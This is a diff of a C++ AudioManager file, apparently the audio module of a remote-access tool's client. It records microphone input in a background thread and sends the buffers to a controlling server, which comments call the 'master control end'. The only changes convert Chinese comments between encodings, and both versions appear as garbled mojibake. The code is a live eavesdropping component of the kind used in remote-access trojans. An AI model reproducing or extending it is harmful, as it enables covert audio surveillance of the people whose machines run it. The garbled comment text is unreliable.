@@ -1,4 +1,4 @@
-// AudioManager.cpp: implementation of the CAudioManager class.
+ï»¿// AudioManager.cpp: implementation of the CAudioManager class.
 //
 //////////////////////////////////////////////////////////////////////
 
@@ -29,7 +29,7 @@ CAudioManager::CAudioManager(IOCPClient* ClientObject, int n, void* user):CManag
     HttpMask mask(DEFAULT_HOST, m_ClientObject->GetClientIPHeader());
     m_ClientObject->Send2Server((char*)&bToken, 1, &mask);
 
-    WaitForDialogOpen();    //µÈ´ı¶Ô»°¿ò´ò¿ª
+    WaitForDialogOpen();    //ç­‰å¾…å¯¹è¯æ¡†æ‰“å¼€
     szPacket = NULL;
 
     m_hWorkThread = __CreateThread(NULL, 0, WorkThread, (LPVOID)this, 0, NULL);
@@ -51,7 +51,7 @@ VOID  CAudioManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
     }
 }
 
-DWORD CAudioManager::WorkThread(LPVOID lParam)   //·¢ËÍÉùÒôµ½·şÎñ¶Ë
+DWORD CAudioManager::WorkThread(LPVOID lParam)   //å‘é€å£°éŸ³åˆ°æœåŠ¡ç«¯
 {
     CAudioManager *This = (CAudioManager *)lParam;
     while (This->m_bIsWorking && !This->g_bExit) {
@@ -68,18 +68,18 @@ BOOL CAudioManager::SendRecordBuffer()
 {
     DWORD	dwBufferSize = 0;
     BOOL	dwReturn = 0;
-    //ÕâÀïµÃµ½ ÒôÆµÊı¾İ
+    //è¿™é‡Œå¾—åˆ° éŸ³é¢‘æ•°æ®
     LPBYTE	szBuffer = m_AudioObject->GetRecordBuffer(&dwBufferSize);
     if (szBuffer == NULL)
         return 0;
-    //·ÖÅä»º³åÇø
+    //åˆ†é…ç¼“å†²åŒº
     szPacket = szPacket ? szPacket : new BYTE[dwBufferSize + 1];
-    //¼ÓÈëÊı¾İÍ·
-    szPacket[0] = TOKEN_AUDIO_DATA;     //ÏòÖ÷¿Ø¶Ë·¢ËÍ¸ÃÏûÏ¢
-    //¸´ÖÆ»º³åÇø
+    //åŠ å…¥æ•°æ®å¤´
+    szPacket[0] = TOKEN_AUDIO_DATA;     //å‘ä¸»æ§ç«¯å‘é€è¯¥æ¶ˆæ¯
+    //å¤åˆ¶ç¼“å†²åŒº
     memcpy(szPacket + 1, szBuffer, dwBufferSize);
     szPacket[dwBufferSize] = 0;
-    //·¢ËÍ³öÈ¥
+    //å‘é€å‡ºå»
     if (dwBufferSize > 0) {
         dwReturn = m_ClientObject->Send2Server((char*)szPacket, dwBufferSize + 1);
     }
@@ -88,9 +88,9 @@ BOOL CAudioManager::SendRecordBuffer()
 
 CAudioManager::~CAudioManager()
 {
-    m_bIsWorking = FALSE;                            //Éè¶¨¹¤×÷×´Ì¬Îª¼Ù
+    m_bIsWorking = FALSE;                            //è®¾å®šå·¥ä½œçŠ¶æ€ä¸ºå‡
     if (m_hWorkThread)
-        WaitForSingleObject(m_hWorkThread, INFINITE);    //µÈ´ı ¹¤×÷Ïß³Ì½áÊø
+        WaitForSingleObject(m_hWorkThread, INFINITE);    //ç­‰å¾… å·¥ä½œçº¿ç¨‹ç»“æŸ
     if (m_hWorkThread)
         SAFE_CLOSE_HANDLE(m_hWorkThread);
 
@@ -108,16 +108,16 @@ CAudioManager::~CAudioManager()
 //USB
 BOOL CAudioManager::Initialize()
 {
-    if (!waveInGetNumDevs())   //»ñÈ¡²¨ĞÎÊäÈëÉè±¸µÄÊıÄ¿  Êµ¼Ê¾ÍÊÇ¿´¿´ÓĞÃ»ÓĞÉù¿¨
+    if (!waveInGetNumDevs())   //è·å–æ³¢å½¢è¾“å…¥è®¾å¤‡çš„æ•°ç›®  å®é™…å°±æ˜¯çœ‹çœ‹æœ‰æ²¡æœ‰å£°å¡
         return FALSE;
 
     // SYS    SYS P
-    // ÕıÔÚÊ¹ÓÃÖĞ.. ·ÀÖ¹ÖØ¸´Ê¹ÓÃ
+    // æ­£åœ¨ä½¿ç”¨ä¸­.. é˜²æ­¢é‡å¤ä½¿ç”¨
     if (m_bIsWorking==TRUE) {
         return FALSE;
     }
 
-    m_AudioObject = new CAudio;  //¹¦ÄÜÀà
+    m_AudioObject = new CAudio;  //åŠŸèƒ½ç±»
 
     m_bIsWorking = TRUE;
     return TRUE;
